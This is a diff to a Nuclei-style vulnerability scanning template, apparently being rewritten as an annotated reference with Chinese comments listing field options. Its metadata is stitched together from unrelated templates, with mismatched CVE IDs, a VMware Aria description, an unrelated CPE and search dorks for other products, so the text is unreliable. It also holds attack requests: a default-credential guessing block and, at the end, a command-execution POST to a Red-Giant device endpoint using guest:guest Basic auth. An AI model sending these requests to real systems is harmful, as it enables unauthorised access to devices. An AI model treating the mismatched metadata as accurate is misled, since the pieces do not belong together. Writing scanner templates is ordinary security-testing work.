@@ -5,7 +5,7 @@ info:
   author: rootxharsh,iamnoooob,pdresearch
   severity: high
   description: |
-    VMware Aria Operations for Logs contains a deserialization vulnerability. An unauthenticated, malicious 
+    VMware Aria Operations for Logs contains a deserialization vulnerability. An unauthenticated
   reference:
     - https://www.vmware.com/security/advisories/VMSA-2023-0007.html
     - https://nvd.nist.gov/vuln/detail/CVE-2023-20864
@@ -14,11 +14,14 @@ info:
     cvss-score: 8.8
     cve-id: CVE-2022-34753
     cwe-id: CWE-78
+    cpe: cpe:2.3:a:readtomyshoe_project:readtomyshoe:*:*:*:*:*:*:*:*
     epss-score: 0.96979
   metadata:
     max-request: 2 # 表示需要请求数为2,看以下http:raw
-    shodan-query: title:"vRealize Log Insight"
     verified: true
+    shodan-query: title:"vRealize Log Insight"
+    google-query: intitle:"index of" "WebServers.xml"
+    fofa-query: title="Repetier-Server"
   remediation: Ensure proper access or disable completely.
   tags: cve,cve2023,vmware,aria,rce,oasts
 
@@ -55,8 +58,9 @@ http:
           - "/view/js/xiuno.js"
           - "Choose Language (选择语言)"
         condition: and
+        negative: true
 
-  - raw:
+  - raw: # 未处理的信息
       - |
         GET /csrf HTTP/1.1
         Host: {{Hostname}}
@@ -101,7 +105,7 @@ http:
 
         {"userName":"{{user}}","password":"{{pass}}"}
 
-    attack: pitchfork
+    attack: pitchfork # [pitchfork、clusterbomb、batteringram]
     payloads:
       user:
         - admin
@@ -111,16 +115,27 @@ http:
         - cs141-snmp
         - engineer
         - guest
+      password:
+        - "{{randstr}}"
 
+    digest-username: admin
+    digest-password: admin
+    iterate-all: true
+    skip-variables-check: true
     stop-at-first-match: true
     cookie-reuse: true
     host-redirects: true
     max-redirects: 2
     matchers-condition: and
     req-condition: true
+    threads: 30
+    max-size: 2048
+    unsafe: true
+    read-all: true
     matchers:
-      - type: word
-        part: interactsh_protocol
+      - type: word # [word、regex、status、dsl、...]
+        part: interactsh_protocol # [body、body_5、header]
+        name: composer.lock # [composer.lock、composer.json、...]
         words:
           - "dns"
 
@@ -129,7 +144,7 @@ http:
         words:
           - "<?php"
           - '"errorMessage":"Internal error'
-        condition: and
+        condition: and # [and、or]
 
       - type: regex
         regex:
@@ -151,12 +166,10 @@ http:
           - 'contains(body_2, "Windows IP")'
         condition: and
 
-    threads: 30
-    cookie-reuse: true
     extractors:
-      - type: kval
+      - type: kval # [kval、regex、xpath]
         internal: true
-        name: xcsrftoken
+        name: xcsrftoken # [printerID、cid、endpoint、xcsrftoken、date、file、authenticity_token] # name表示匹配时对应的是哪个请求
         group: 1
         kval:
           - "X_CSRF_Token"
@@ -192,3 +205,10 @@ http:
         group: 1
         regex:
           - 'name="atlassian\-token" content="([a-z0-9]+)"> '
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/WEB_VMS/LEVEL15/"
+    headers:
+      Authorization: Basic Z3Vlc3Q6Z3Vlc3Q=
+    body: command=show basic-info dev&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.
